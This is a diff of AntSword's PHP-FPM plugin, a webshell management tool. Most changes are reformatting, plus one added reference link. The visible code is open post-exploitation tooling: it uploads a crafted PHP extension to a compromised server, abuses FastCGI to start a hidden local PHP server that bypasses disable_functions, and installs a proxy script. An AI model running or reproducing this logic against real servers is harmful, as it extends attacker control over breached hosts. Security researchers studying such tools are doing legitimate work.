@@ -3,7 +3,9 @@
 const Base = require('../base');
 const LANG = require('../../language'); // 插件语言库
 const LANG_T = antSword['language']['toastr']; // 通用通知提示
-const {FastCgiClient} = require('../../payload');
+const {
+  FastCgiClient
+} = require('../../payload');
 let PHP_FPM_LANG = LANG['core']['php_fpm'];
 
 class PHP_FPM extends Base {
@@ -14,7 +16,7 @@ class PHP_FPM extends Base {
    */
   constructor(cell, top) {
     super(cell, top);
-    if(this.precheck() == false) {
+    if (this.precheck() == false) {
       return;
     }
     this.form = this.createForm(this.cell);
@@ -33,80 +35,97 @@ class PHP_FPM extends Base {
 
   createForm(cell) {
     let form = cell.attachForm([{
-      type: 'settings',
-      position: 'label-left',
-      labelWidth: 100,
-      inputWidth: 300,
-    }, {
-      type: 'block',
-      inputWidth: 'auto',
-      list: [
-        { type: 'label', label: PHP_FPM_LANG['title']},
-        { type: 'combo', label: PHP_FPM_LANG['form']['fpm_addr'], labelWidth: 300, name: 'fpm_addr', required: true,
-          options: (() => {
-            let vals = [
-              'unix:///var/run/php5-fpm.sock',
-              'unix:///var/run/php/php5-fpm.sock',
-              'unix:///var/run/php-fpm/php5-fpm.sock',
-              'unix:///var/run/php/php7-fpm.sock',
-              '/var/run/php/php7.2-fpm.sock',
-              '/usr/local/var/run/php7.3-fpm.sock',
-              'localhost:9000',
-              '127.0.0.1:9000',
-            ];
-            let ret = [];
-            vals.map((_) => {
-              ret.push({
-                text: _,
-                value: _
-              });
-            });
-            return ret;
-          })()
-        },
-        { type: 'combo', label: PHP_FPM_LANG['form']['phpbinary'], labelWidth: 300, name: 'phpbinary', required: true,
-          options: (() => {
-            let vals = [
-              'php',
-              'php.exe',
-              '/usr/bin/php',
-              'C:/php/php.exe'
-            ];
-            let ret = [];
-            vals.map((_) => {
-              ret.push({
-                text: _,
-                value: _
-              });
-            });
-            return ret;
-          })()
-        }
-      ]},
-    {
-      type: 'block',
-      labelWidth: 100,
-      inputWidth: 'auto',
-      className: "display: flex;flex-direction: row;align-items: center;",
-      list: [{
-        type: 'label',
-        label: '',
-        name: 'status_label'
+        type: 'settings',
+        position: 'label-left',
+        labelWidth: 100,
+        inputWidth: 300,
       }, {
-        type: 'newcolumn',
-        offset: 20
+        type: 'block',
+        inputWidth: 'auto',
+        list: [{
+            type: 'label',
+            label: PHP_FPM_LANG['title']
+          },
+          {
+            type: 'combo',
+            label: PHP_FPM_LANG['form']['fpm_addr'],
+            labelWidth: 300,
+            name: 'fpm_addr',
+            required: true,
+            options: (() => {
+              let vals = [
+                'unix:///var/run/php5-fpm.sock',
+                'unix:///var/run/php/php5-fpm.sock',
+                'unix:///var/run/php-fpm/php5-fpm.sock',
+                'unix:///var/run/php/php7-fpm.sock',
+                '/var/run/php/php7.2-fpm.sock',
+                '/usr/local/var/run/php7.3-fpm.sock',
+                'localhost:9000',
+                '127.0.0.1:9000',
+              ];
+              let ret = [];
+              vals.map((_) => {
+                ret.push({
+                  text: _,
+                  value: _
+                });
+              });
+              return ret;
+            })()
+          },
+          {
+            type: 'combo',
+            label: PHP_FPM_LANG['form']['phpbinary'],
+            labelWidth: 300,
+            name: 'phpbinary',
+            required: true,
+            options: (() => {
+              let vals = [
+                'php',
+                'php.exe',
+                '/usr/bin/php',
+                'C:/php/php.exe'
+              ];
+              let ret = [];
+              vals.map((_) => {
+                ret.push({
+                  text: _,
+                  value: _
+                });
+              });
+              return ret;
+            })()
+          }
+        ]
+      },
+      {
+        type: 'block',
+        labelWidth: 100,
+        inputWidth: 'auto',
+        className: "display: flex;flex-direction: row;align-items: center;",
+        list: [{
+          type: 'label',
+          label: '',
+          name: 'status_label'
+        }, {
+          type: 'newcolumn',
+          offset: 20
+        }, {
+          type: 'label',
+          label: '',
+          name: 'status_msg'
+        }, ]
       }, {
-        type: 'label',
-        label: '',
-        name: 'status_msg'
-      }, ]
-    }, {
-      type: 'block',
-      inputWidth: 'auto',
-      list: [
-        { type: 'template', label: "Reference", style: "width:100%;", format:references },
-      ]
-    }], true);
+        type: 'block',
+        inputWidth: 'auto',
+        list: [{
+          type: 'template',
+          label: "Reference",
+          style: "width:100%;",
+          format: references
+        }, ]
+      }
+    ], true);
     return form;
   }
 
@@ -116,7 +135,7 @@ class PHP_FPM extends Base {
     let fpm_host = '';
     let fpm_port = -1;
     let port = Math.floor(Math.random() * 5000) + 60000; // 60000~65000
-    if(self.form.validate()){
+    if (self.form.validate()) {
       self.cell.progressOn();
       let core = self.top.core;
       let formvals = self.form.getValues();
@@ -132,28 +151,28 @@ class PHP_FPM extends Base {
       }
       // 生成 ext
       let wdir = "";
-      if(self.isOpenBasedir) {
-        for(var v in self.top.infodata.open_basedir) {
-          if(self.top.infodata.open_basedir[v] == 1) {
+      if (self.isOpenBasedir) {
+        for (var v in self.top.infodata.open_basedir) {
+          if (self.top.infodata.open_basedir[v] == 1) {
             if (v == self.top.infodata.phpself) {
               wdir = v;
-            }else{
+            } else {
               wdir = v;
             }
             break;
           }
         };
-      }else{
+      } else {
         wdir = self.top.infodata.temp_dir;
       }
       let cmd = `${phpbinary} -n -S 127.0.0.1:${port} -t ${self.top.infodata.phpself}`;
       let fileBuffer = self.generateExt(cmd);
-      if(!fileBuffer) {
+      if (!fileBuffer) {
         toastr.warning(PHP_FPM_LANG['msg']['genext_err'], LANG_T["warning"]);
         self.cell.progressOff();
         return
       }
-      
+
       new Promise((res, rej) => {
         var ext_path = `${wdir}/.${String(Math.random()).substr(2, 5)}${self.ext_name}`;
         // 上传 ext
@@ -167,7 +186,7 @@ class PHP_FPM extends Base {
           if (ret === '1') {
             toastr.success(`Upload extension ${ext_path} success.`, LANG_T['success']);
             res(ext_path);
-          }else{
+          } else {
             rej("upload extension fail");
           }
         }).catch((err) => {
@@ -200,12 +219,12 @@ class PHP_FPM extends Base {
         `;
         core.request({
           _: payload,
-        }).then((response)=>{
-          
-        }).catch((err)=>{
+        }).then((response) => {
+
+        }).catch((err) => {
           // 超时也是正常
         })
-      }).then(()=>{
+      }).then(() => {
         // 验证是否成功开启
         var payload = `sleep(1);
           $fp = @fsockopen("127.0.0.1", ${port}, $errno, $errstr, 1);
@@ -215,35 +234,37 @@ class PHP_FPM extends Base {
             echo(1);
             @fclose($fp);
           };`
-          core.request({
-            _: payload,
-          }).then((response)=>{
-            var ret = response['text'];
-            if (ret === '1') {
-              toastr.success(LANG['success'], LANG_T['success']);
-              self.uploadProxyScript("127.0.0.1", port);
-              self.cell.progressOff();
-            }else{
-              self.cell.progressOff();
-              throw("exploit fail");
-            } 
-          }).catch((err)=>{
+        core.request({
+          _: payload,
+        }).then((response) => {
+          var ret = response['text'];
+          if (ret === '1') {
+            toastr.success(LANG['success'], LANG_T['success']);
+            self.uploadProxyScript("127.0.0.1", port);
             self.cell.progressOff();
-            toastr.error(`${LANG['error']}: ${JSON.stringify(err)}`, LANG_T['error']);
-          })
-      }).catch((err)=>{
+          } else {
+            self.cell.progressOff();
+            throw ("exploit fail");
+          }
+        }).catch((err) => {
+          self.cell.progressOff();
+          toastr.error(`${LANG['error']}: ${JSON.stringify(err)}`, LANG_T['error']);
+        })
+      }).catch((err) => {
         self.cell.progressOff();
         toastr.error(`${LANG['error']}: ${JSON.stringify(err)}`, LANG_T['error']);
       });
-    }else{
+    } else {
       self.cell.progressOff();
       toastr.warning(LANG['form_not_comp'], LANG_T["warning"]);
     }
     return;
   }
 }
+
 function references(name, value) {
   let refs = {
+    "AntSword-Labs/bypass_disable_functions/5": "https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5/",
     "Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写 (Author: phithon)": "https://www.leavesongs.com/penetration/fastcgi-and-php-fpm.html",
     "Fastcgi配置不当对外开放利用 (Author: Vinc)": "http://vinc.top/2016/11/23/%E3%80%90%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8%E3%80%91fastcgi%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%B9%E5%A4%96%E5%BC%80%E6%94%BE%E5%88%A9%E7%94%A8/",
     "PHP-FastCGI-Client (Author: adoy)": "https://github.com/adoy/PHP-FastCGI-Client",
